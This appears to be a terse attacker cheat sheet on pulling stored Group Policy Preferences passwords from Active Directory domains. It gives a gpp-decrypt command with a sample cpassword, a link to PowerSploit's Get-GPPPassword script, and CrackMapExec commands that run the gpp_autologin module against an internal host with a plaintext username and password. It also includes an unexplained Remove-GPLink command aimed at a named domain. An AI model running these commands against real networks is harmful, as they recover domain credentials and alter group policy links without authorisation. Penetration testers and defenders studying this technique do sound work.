# Group Policy Preferences (GPP)

* GROUPS.XML - Patched in 2014, still able to find domains where this exists
* cpassword - AES encrypted but they can be decrypted with Microsofts private key

```
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

* Find GPP Passwords
* https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

### CRACKMAPEXEC

```
crackmapexec smb -L | grep gpp
```

* Using CrackMapExec's gpp\_autologin Module

```
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

Remove-GPLink -Name "MGMTTestGPO" -Target "CN=Default-First-Site-Name,cn=Sites,CN=Configuration,DC=MGMT,DC=EVERGREENHEALTH,DC=SYS"
```
